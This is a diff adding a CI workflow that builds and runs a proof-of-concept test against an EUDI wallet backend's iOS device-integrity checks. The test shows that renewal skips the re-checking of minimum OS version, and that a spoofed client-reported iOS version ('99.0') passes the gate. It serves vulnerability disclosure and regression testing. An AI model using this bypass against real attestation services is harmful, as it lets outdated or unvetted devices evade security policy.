@@ -1,0 +1,163 @@
+name: iOS MDVM renewal policy bypass PoC
+
+on:
+  push:
+    branches:
+      - poc/ios-mdvm-renewal-policy-bypass
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: '25'
+          cache: gradle
+
+      - name: Fetch pinned real App Attest fixture and generate regression test
+        shell: bash
+        run: |
+          set -euo pipefail
+          curl -fsSL             https://raw.githubusercontent.com/veehaitch/devicecheck-appattest/cb26211f63c1e2e7949deafe2efdf352daca27fa/src/test/resources/ios-14.4.yaml             -o /tmp/ios-14.4.yaml
+          python -m pip install --disable-pip-version-check pyyaml
+          python - <<'PY'
+          import yaml, pathlib
+          docs=list(yaml.safe_load_all(open('/tmp/ios-14.4.yaml')))
+          att=next(x for x in docs if x and x.get('type')=='attestation')
+          assertion=next(x for x in docs if x and x.get('type')=='assertion')
+          out=pathlib.Path('src/test/kotlin/de/eudiwallet/backend/mdvm/IosRenewalPolicyBypassPoCTest.kt')
+          out.parent.mkdir(parents=True,exist_ok=True)
+          src=r'''package de.eudiwallet.backend.mdvm
+
+          import at.asitplus.attestation.AttestationResult
+          import at.asitplus.attestation.IosAttestationConfiguration
+          import at.asitplus.attestation.Makoto
+          import io.mockk.mockk
+          import java.time.Clock
+          import java.time.Duration
+          import java.time.Instant
+          import java.time.ZoneOffset
+          import java.util.Base64
+          import kotlin.test.Test
+          import kotlin.test.assertFailsWith
+          import kotlin.test.assertIs
+          import kotlin.test.assertTrue
+
+          class IosRenewalPolicyBypassPoCTest {
+              private val teamId = "__TEAM__"
+              private val bundleId = "__BUNDLE__"
+              private val attestation = Base64.getDecoder().decode("__ATTESTATION__")
+              private val assertion = Base64.getDecoder().decode("__ASSERTION__")
+              private val clientData = Base64.getDecoder().decode("__CLIENT_DATA__")
+
+              private fun makoto(minVersion: String, build: String): Makoto =
+                  Makoto(
+                      iosAttestationConfigurationJ =
+                          IosAttestationConfiguration(
+                              singleApp = IosAttestationConfiguration.AppData(
+                                  teamIdentifier = teamId,
+                                  bundleIdentifier = bundleId,
+                                  sandbox = true,
+                              ),
+                              iosVersion = IosAttestationConfiguration.OsVersions(minVersion, build),
+                          ),
+                      verificationTimeOffsetJ = Duration.ofMinutes(5),
+                      javaClock = Clock.fixed(Instant.parse("2021-01-23T12:14:00Z"), ZoneOffset.UTC),
+                  )
+
+              @Test
+              fun storedAppAttestAssertionSurvivesRaisedMinVersionWhileClientDeviceClassCanSpoofCurrentVersion() {
+                  // Fixture's certificate carries an attested iOS version of 14.4.
+                  val oldPolicy = makoto("14.0", "18A373")
+                  val oldResult = oldPolicy.ios.verifyAppAttestation(attestation, clientData)
+                  val verified = assertIs<AttestationResult.IOS.Verified>(oldResult)
+                  println("ATTESTED_IOS_VERSION=" + verified.attestation.iOSVersion)
+                  println("OLD_POLICY_FRESH_ATTESTATION_ACCEPTED=true")
+
+                  // Raise policy above the device's attested 14.4.
+                  val newPolicy = makoto("15.0", "19A346")
+                  val freshUnderNewPolicy = newPolicy.ios.verifyAppAttestation(attestation, clientData)
+                  assertIs<AttestationResult.Error>(freshUnderNewPolicy)
+                  println("NEW_POLICY_FRESH_ATTESTATION_REJECTED=true")
+
+                  // Renewal does not re-run attestation/version policy. It validates only the
+                  // assertion against the previously stored ValidatedAttestation.
+                  val renewed = newPolicy.ios.validateAssertionOverChallenge(
+                      verified.attestation,
+                      assertion,
+                      clientData,
+                      lastSeenCounter = 0,
+                      maxCounterAdvance = 1,
+                  )
+                  assertTrue(renewed.isSuccess, renewed.exceptionOrNull()?.message)
+                  println("NEW_POLICY_STORED_ATTESTATION_ASSERTION_ACCEPTED=true")
+
+                  // German backend's *current* OS gate is based on client JSON, not the
+                  // attested iOSVersion. A truthful 14.4 claim fails after policy raise...
+                  val config =
+                      IOSIntegrityConfig(
+                          allowSkipKeyAttestation = false,
+                          appId = teamId,
+                          acceptableBundleIdList = listOf(bundleId),
+                          allowAppAttestDevEnvironment = true,
+                          minimalOsVersion = "15.0",
+                          minimalBuildNumber = "19A346",
+                          vulnerableClassesResource = null,
+                          counterJumpLoggingThreshold = 5,
+                      )
+                  val service =
+                      MdvmService(
+                          makoto = newPolicy,
+                          mdvmAnalyticsRepository = mockk(),
+                          telemetryService = mockk(),
+                          iosConfig = config,
+                          androidConfig = mockk(),
+                      )
+
+                  val storedDeviceClass =
+                      IosDeviceInfo(
+                          model = "iPhone",
+                          hardwareModel = "iPhone12,1",
+                          uname = "Darwin",
+                          osVersion = "Version 14.4",
+                          systemVersion = "14.4",
+                      )
+                  assertFailsWith<IosKeyAttestationException.MinimalVersionViolation> {
+                      service.verifyIosDeviceProperties(storedDeviceClass, storedDeviceClass)
+                  }
+                  println("TRUTHFUL_CURRENT_VERSION_REJECTED=true")
+
+                  // ...but a higher client-reported systemVersion is accepted. Model/hardware
+                  // remain stable, and increasing version is explicitly allowed.
+                  val spoofed = storedDeviceClass.copy(
+                      systemVersion = "99.0",
+                      osVersion = "Version 99.0",
+                  )
+                  service.verifyIosDeviceProperties(spoofed, storedDeviceClass)
+                  println("SPOOFED_CURRENT_VERSION_ACCEPTED=true")
+
+                  println("IOS_MDVM_RENEWAL_POLICY_BYPASS_CONFIRMED=true")
+              }
+          }
+          '''
+          repl={
+            "__TEAM__":att["teamIdentifier"],
+            "__BUNDLE__":att["bundleIdentifier"],
+            "__ATTESTATION__":att["attestationBase64"],
+            "__ASSERTION__":assertion["assertionBase64"],
+            "__CLIENT_DATA__":att["clientDataBase64"],
+          }
+          for k,v in repl.items(): src=src.replace(k,v)
+          out.write_text(src)
+          PY
+
+      - name: Run regression PoC against actual backend and App Attest verifier classes
+        run: ./gradlew --no-daemon test --tests de.eudiwallet.backend.mdvm.IosRenewalPolicyBypassPoCTest --info
